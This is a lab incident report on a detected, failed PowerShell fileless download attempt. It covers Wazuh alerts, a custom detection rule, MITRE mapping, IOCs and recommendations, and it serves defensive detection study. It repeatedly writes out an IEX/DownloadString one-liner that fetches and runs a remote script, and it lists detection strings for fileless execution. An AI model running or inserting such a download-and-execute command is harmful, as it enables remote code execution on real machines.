# Investigation: Suspicious PowerShell Execution (Fileless Download Attempt)

| Field | Value |
|-------|-------|
| ID | INV-002 |
| Severity | Low (logged attempt, no payload executed) |
| Status | Closed |
| Analyst | AlertCheck |
| Detection | [detections/powershell-execution.xml](../detections/powershell-execution.xml) |
| Triggered rules | 91837 (built-in), 100002 (custom) |

## 1. Summary

On the Win10 Target, a PowerShell one-liner was executed that attempts to download and run a remote script in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.129/test.ps1')
```

The command was run both directly in an interactive PowerShell session and wrapped in `powershell.exe -Command`. In both cases the download failed with a `WebException` (`Невозможно соединиться с удаленным сервером`), because no HTTP server was listening on the Kali host and no `test.ps1` file existed there — **no remote payload was ever retrieved or executed**.

PowerShell Script Block Logging (Event ID 4104) recorded the full command text regardless of the download's outcome, since the script block is logged before PowerShell attempts to run it. Wazuh's built-in rule 91837 matched the generic `Invoke-Expression` pattern (level 4), and custom rule **100002** — built on top of 91837, checking for `DownloadString`/`EncodedCommand`/`FromBase64String`/`Invoke-Expression` in the logged script block text — fired at level 12.

**Verdict:** fileless execution attempt detected via Script Block Logging. The attempt did not complete (no outbound payload was retrieved), but the detection worked independently of that outcome — which is the point of logging at the script-block level rather than relying on network telemetry alone.

## 2. Timeline (UTC — convert from your tool's local display before filling in)

| Time | Source | Event |
|------|--------|-------|
| 19:02:13 | Target (interactive PowerShell) | `powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.129/test.ps1')"` run; fails with WebException |
| 19:02:13.964 | Wazuh | Rule 100002 fires on this script block — 1st alert |
| 19:02:14 | Target (interactive PowerShell) | Direct `IEX (New-Object Net.WebClient).DownloadString(...)` run; fails with WebException |
| 19:02:15.017 | Wazuh | Rule 100002 fires on this script block — 2nd alert |

## 3. TTP (MITRE ATT&CK)

| Tactic | Technique | ID | Observed as |
|--------|-----------|----|-------------|
| Execution | Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | `IEX (New-Object Net.WebClient).DownloadString(...)` logged via Script Block Logging |

T1105 (Ingress Tool Transfer) is **not** claimed here, since the download never completed and no file or tool was actually transferred to the host.

## 4. Evidence

### 4.1 Attack command (executed on the target)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.129/test.ps1')
```

### 4.2 Execution result

```text
Исключение при вызове "DownloadString" с "1" аргументами: "Невозможно соединиться с удаленным сервером"
+ CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ FullyQualifiedErrorId : WebException
```

### 4.3 Script Block Logging events (Event ID 4104), queried via `Get-WinEvent`

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 20 |
  Where-Object {$_.Id -eq 4104 -and $_.Message -like "*DownloadString*"} |
  Format-List TimeCreated, Message
```

Both the direct `IEX` call and the `powershell.exe -Command` variant were captured as separate script blocks with distinct `ScriptBlockId` values.

### 4.4 Wazuh Discover query used

```text
data.win.system.eventID: 4104
```

Scoped to this scenario's two script blocks (a third, unrelated 4104 hit from a `secedit`/`Select-String` command seen in the same search window belongs to a different test and is not part of this case).

### 4.5 Rule 91837 alert (built-in)

```json
"rule": {
  "firedtimes": 2,
  "level": 4,
  "description": "Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code",
  "groups": ["windows", " powershell"],
  "mitre": {
    "technique": ["PowerShell"],
    "id": ["T1059.001"],
    "tactic": ["Execution"]
  },
  "id": "91837"
}
```

### 4.6 Rule 100002 alert (custom)

```json
"rule": {
  "firedtimes": 1,
  "level": 12,
  "description": "Custom: Suspicious PowerShell Execution Detected (MITRE T1059.001)",
  "groups": ["windows", "powershell", "execution"],
  "mitre": {
    "technique": ["PowerShell"],
    "id": ["T1059.001"],
    "tactic": ["Execution"]
  },
  "id": "100002"
}
```

### 4.7 Custom rule as deployed

```bash
sudo grep -A 8 'id="100002"' /var/ossec/etc/rules/local_rules.xml
```

```xml
<rule id="100002" level="12">
  <if_sid>91837</if_sid>
  <field name="win.eventdata.scriptBlockText">DownloadString|EncodedCommand|FromBase64String|Invoke-Expression</field>
  <description>Custom: Suspicious PowerShell Execution Detected (MITRE T1059.001)</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
  <group>execution</group>
</rule>
```

### 4.8 Screenshots

| # | Description | File |
|---|-------------|------|
| 1 | PowerShell prompt on the target, before the attack | `../screenshots/ps-01-before-attack.png` |
| 2 | Attack command run and its failure (WebException) | `../screenshots/ps-02-attack-command.png` |
| 3 | Wazuh Discover: raw Event 4104 hits | `../screenshots/ps-03-4104.png` |
| 4 | Rule 91837 alert detail (built-in) | `../screenshots/ps-04-wazuh-alert.png` |
| 5 | Event 4104 detail via `Get-WinEvent` | `../screenshots/ps-05-event-4104.png` |
| 6 | Wazuh Discover: `rule.id:100002` hits | `../screenshots/ps-06-alert-100002.png` |
| 7 | Rule 100002 alert detail (JSON) | `../screenshots/ps-07-rule-100002-detail.png` |
| 8 | Custom rule 100002 as deployed in `local_rules.xml` | `../screenshots/ps-08-custom-rule.png` |

## 5. IOCs

| Type | Value | Context |
|------|-------|---------|
| Command pattern | `(New-Object Net.WebClient).DownloadString(...)` wrapped in `IEX` | Fileless download/execution pattern |
| Host | Win10 Target | Where the command was executed locally |
| Remote URL | `http://192.168.230.129/test.ps1` | Target of the (failed) download, Kali host |
| Event ID | 4104 | PowerShell Script Block Logging |

## 6. Detection

| Rule | Level | Logic |
|------|-------|-------|
| 91837 (built-in) | 4 | Script block text matches a generic `Get-Content -Stream`/`Invoke-Expression` pattern |
| 100002 (custom) | 12 | Script block text (via rule 91837) matches `DownloadString`, `EncodedCommand`, `FromBase64String`, or `Invoke-Expression` |

**Assessment:** rule 100002 fired twice during the run — once for each command variant (`IEX ...` direct and `powershell.exe -Command "..."`). Since this is a simple single-event match rule (no `frequency`/`timeframe`), each matching script block produces its own alert with `firedtimes: 1`, rather than one counter accumulating across both.

## 7. Lessons Learned

- Script Block Logging captures the command text before PowerShell attempts to execute it, so detection does not depend on the attack succeeding — a failed `DownloadString` call is just as visible as a successful one.
- The built-in rule 91837 is a reasonable baseline but low-severity (level 4) and generically worded; narrowing the match to specific fileless-execution strings and raising the severity in a custom rule makes the signal more actionable.
- Running the same command two different ways (`IEX ...` directly, and `powershell.exe -Command "..."`) produced two separate script blocks with distinct `ScriptBlockId` values — useful to know when correlating related activity, since they don't share an identifier by default.

## 8. Recommendations

| Priority | Recommendation |
|----------|----------------|
| High | Keep PowerShell Script Block Logging enabled on all monitored Windows hosts — it caught this attempt regardless of network outcome |
| Medium | Add a correlation rule linking rule 100002 to outbound network activity from `powershell.exe` (via Sysmon Event 3) to distinguish logged-but-failed attempts from ones that reached a live server |
| Medium | Expand the custom rule's string list to cover additional fileless patterns (`IEX`, `.Invoke(`, `-enc`, `-nop`) seen in common offensive tooling |
| Low | Consider PowerShell Constrained Language Mode or AppLocker on the target to reduce the blast radius of any script that does execute |
